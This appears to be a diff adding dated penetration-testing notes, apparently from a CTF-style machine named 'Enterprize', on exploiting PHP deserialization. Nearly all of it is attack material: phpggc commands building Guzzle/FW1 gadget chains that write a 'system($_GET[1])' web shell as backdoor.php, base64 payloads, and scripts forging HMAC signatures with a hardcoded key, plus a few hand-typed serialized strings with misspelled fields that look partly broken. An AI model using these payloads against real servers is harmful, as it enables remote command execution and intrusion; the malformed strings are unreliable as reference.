@@ -574,6 +574,72 @@ print($secret);
 ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/fileadmin/_temp_/exp.php 
 
 
+<p>----------------------------------</p>
+<p>2025, October 26</p>
+
+<img width="1061" height="442" alt="image" src="https://github.com/user-attachments/assets/7462dd75-6c3b-4712-80bc-b7412f7f7342" />
 
 
 
+<?php
+$sig = hash_hmac('sha384', $argv[1], "712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b");
+print($sig);
+?>
+
+
+
+
+:~/Enterprize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/wwww/html/public/fileadmin/_temp_/backdoor.php /root/Enterprize/phpggc/aux.php
+YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTE6Ii92YXIvd3d3dy9odG1sL3B1YmxpYy9maWxlYWRtaW4vX3RlbXBfL2JhY2tkb29yLnBocCI7czo1MjoiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAc3RvcmVTZXNzaW9uQ29va2llcyI7YjoxO3M6MzY6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAY29va2llcyI7YToxOntpOjA7TzoyNzoiR3V6emxlSHR0cFxDb29raWVcU2V0Q29va2llIjoxOntzOjMzOiIAR3V6emxlSHR0cFxDb29raWVcU2V0Q29va2llAGRhdGEiO2E6Mzp7czo3OiJFeHBpcmVzIjtpOjE7czo3OiJEaXNjYXJkIjtiOjA7czo1OiJWYWx1ZSI7czoyNjoiPD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/PgoiO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7Tjt9aTo3O2k6Nzt9
+
+
+HMAC  SHA1
+
+
+
+SHA1 : 4c21422bd05aaaaff87defd1016c7b203399270e
+
+:~/Enterprize/phpggc# cat aux.php
+<?php system($_GET[1]);?>
+
+
+# cat aux.js
+a:2:{i:7;O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"GuzzleHttp\Cookie\CookieJarCookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:".GuzzleHttp\Cookie\SetCookie.data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:26:"<?php system($_GET[1]);?>";}}}s:39:".GuzzleHttp\Cookie\CookieJarstrictMode";N;s:41:"GuzzleHttp\Cookie\FileCookieJarFilnemae";s:50:"/var/html/public/fileadmin/_temp_/backdoor.php";s:52:"GuzzleHttp\Cookie\FileCookieSessionCookies";b:1;}i:7;i:7;}
+
+
+
+:~/Enterprize/phpggc# cat aux.php
+<?php $output = system($_GET[1]); echo $output ; ?>
+
+
+
+:~/Enterprize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/wwww/html/public/fileadmin/_temp_/aux.php /root/Enterprize/phpggc/aux.php
+YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDY6Ii92YXIvd3d3dy9odG1sL3B1YmxpYy9maWxlYWRtaW4vX3RlbXBfL2F1eC5waHAiO3M6NTI6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAHN0b3JlU2Vzc2lvbkNvb2tpZXMiO2I6MTtzOjM2OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAGNvb2tpZXMiO2E6MTp7aTowO086Mjc6Ikd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZSI6MTp7czozMzoiAEd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZQBkYXRhIjthOjM6e3M6NzoiRXhwaXJlcyI7aToxO3M6NzoiRGlzY2FyZCI7YjowO3M6NToiVmFsdWUiO3M6NTI6Ijw/cGhwICRvdXRwdXQgPSBzeXN0ZW0oJF9HRVRbMV0pOyBlY2hvICRvdXRwdXQgOyA/PgoiO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7Tjt9aTo3O2k6Nzt9
+
+
+
+:~/Enterprize/phpggc# cat script.php
+<?php
+echo hash_hmac('sha1', 'YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NDY6Ii92YXIvd3d3dy9odG1sL3B1YmxpYy9maWxlYWRtaW4vX3RlbXBfL2F1eC5waHAiO3M6NTI6IgBHdXp6bGVIdHRwXENvb2tpZVxGaWxlQ29va2llSmFyAHN0b3JlU2Vzc2lvbkNvb2tpZXMiO2I6MTtzOjM2OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAGNvb2tpZXMiO2E6MTp7aTowO086Mjc6Ikd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZSI6MTp7czozMzoiAEd1enpsZUh0dHBcQ29va2llXFNldENvb2tpZQBkYXRhIjthOjM6e3M6NzoiRXhwaXJlcyI7aToxO3M6NzoiRGlzY2FyZCI7YjowO3M6NToiVmFsdWUiO3M6NTI6Ijw/cGhwICRvdXRwdXQgPSBzeXN0ZW0oJF9HRVRbMV0pOyBlY2hvICRvdXRwdXQgOyA/PgoiO319fXM6Mzk6IgBHdXp6bGVIdHRwXENvb2tpZVxDb29raWVKYXIAc3RyaWN0TW9kZSI7Tjt9aTo3O2k6Nzt9', '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b');
+?>
+
+
+:~/Enterprize/phpggc# php script.php
+0363a381be6878cf3e68acf0c83164642938bcd2
+
+
+<img width="1120" height="674" alt="image" src="https://github.com/user-attachments/assets/52ab6cc1-93dc-45f6-a2b1-4d24d63f7926" />
+
+
+<img width="847" height="254" alt="image" src="https://github.com/user-attachments/assets/eac23ae1-4425-44ee-a87c-c2fde960541f" />
+
+
+
+
+<img width="1123" height="357" alt="image" src="https://github.com/user-attachments/assets/231d6aee-0fad-4e5e-953f-abb33929a809" />
+
+
+<img width="1122" height="357" alt="image" src="https://github.com/user-attachments/assets/cba0417a-d12d-4a29-8fb0-747008b02e12" />
+
+
+a:2:{i:7;O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:36:"GuzzleHttp\Cookie\CookieJarCookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:".GuzzleHttp\Cookie\SetCookie.data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:26:"<?php system($_GET[1]);?>";}}}s:39:".GuzzleHttp\Cookie\CookieJarstrictMode";N;s:41:"GuzzleHttp\Cookie\FileCookieJarFilnemae";s:50:"/var/html/public/fileadmin/_temp_/backdoor.php";s:52:"GuzzleHttp\Cookie\FileCookieSessionCookies";b:1;}i:7;i:7;}
